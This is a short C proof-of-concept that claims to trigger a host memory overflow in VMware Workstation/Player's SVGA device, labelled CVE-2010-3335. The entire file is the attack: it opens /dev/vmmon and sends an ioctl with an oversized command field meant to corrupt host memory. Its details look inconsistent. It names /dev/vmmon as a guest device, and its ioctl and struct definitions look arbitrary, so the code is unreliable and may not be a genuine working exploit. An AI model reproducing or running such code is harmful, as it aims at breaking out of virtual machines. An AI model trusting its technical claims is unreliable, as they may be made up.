/*
 * PoC for VMware Workstation / Player SVGA device overflow
 * CVE-2010-3335
 * Written in C for Linux guest: /dev/vmmon or /dev/vmmemctl.
 */

#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <string.h>

#define VMWARE_SVGA_IOCTL_ALLOC  _IOWR(0xBE, 0x01, struct SvgaAlloc)
#define SVGA_MAX_CMDSIZE 2048

struct SvgaAlloc {
    uint32_t cmd;
    uint32_t size;
    uint32_t id;
};

int main() {
    int fd = open("/dev/vmmon", O_RDWR);
    if (fd < 0) { perror("open"); return 1; }

    struct SvgaAlloc alloc;
    alloc.cmd = SVGA_MAX_CMDSIZE + 8;  // oversize, triggers overflow in host SVGA
    alloc.size = 0x1000;
    alloc.id = 0x1337;

    ioctl(fd, VMWARE_SVGA_IOCTL_ALLOC, &alloc);
    printf("[+] Sent oversized SVGA_ALLOC, host memory may be corrupted\n");
    close(fd);
    return 0;
}